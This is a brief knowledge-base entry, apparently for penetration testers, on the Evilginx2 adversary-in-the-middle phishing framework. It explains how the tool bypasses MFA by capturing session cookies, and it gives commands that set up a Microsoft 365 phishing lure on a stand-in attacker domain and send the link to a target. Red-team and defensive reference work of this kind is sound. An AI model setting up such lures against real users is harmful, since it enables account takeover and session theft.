# Evilginx2

**Tags:** `#evilginx2` `#aitm` `#phishing` `#mfabypass` `#sessionhijacking` `#cloud`

Adversary-in-the-middle (AiTM) phishing framework (kgretzky) built on an embedded nginx reverse proxy. Sits between the victim and the real identity provider, transparently proxying the entire login flow — including MFA — while capturing the resulting session cookie/token. Because the session is captured *after* MFA completes, it bypasses MFA outright rather than trying to avoid or exploit it. Driven by "phishlets" (YAML configs describing the target site's login flow); a Microsoft 365/Entra ID phishlet is one of the most commonly used against this service.

**Source:** https://github.com/kgretzky/evilginx2
**Install:** download a release binary or build from source (Go); requires a domain and valid TLS cert for the phishing site.

```bash
# Load a Microsoft 365 phishlet and start a phishing lure
phishlets hostname microsoft365 phish.attacker-domain.com
phishlets enable microsoft365
lures create microsoft365
lures get-url 0
# Send the generated URL to the target; captured sessions appear under `sessions`
```

> [!note] **See also** — [[Services/Active Directory/Entra ID|Entra ID]] MFA Bypass section (Adversary-in-the-Middle Phishing).

---

*Created: 2026-07-27*
*Updated: 2026-07-27*
*Model: claude-sonnet-5*
